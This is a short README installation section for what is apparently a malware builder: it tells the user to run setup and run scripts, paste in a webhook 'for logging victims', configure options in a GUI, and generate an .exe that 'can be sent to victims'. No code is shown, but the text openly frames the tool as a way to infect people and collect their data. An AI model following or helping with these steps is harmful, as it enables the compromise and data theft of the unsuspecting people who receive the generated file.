## Installation

### Prerequisites

- Python (3.11+)
- Webhook (for logging victims)

### Steps

1. Download the files and extract them from the .zip folder.
2. Open the `setup.bat` file, which will install the required modules for you.
3. Open `run.bat` as an administrator to launch the GUI.
4. Create a webhook for logging victims and paste it into the GUI when prompted.
5. Configure the desired options in the GUI.
6. Once complete, the .exe file will be generated in the same folder and can be sent to victims.
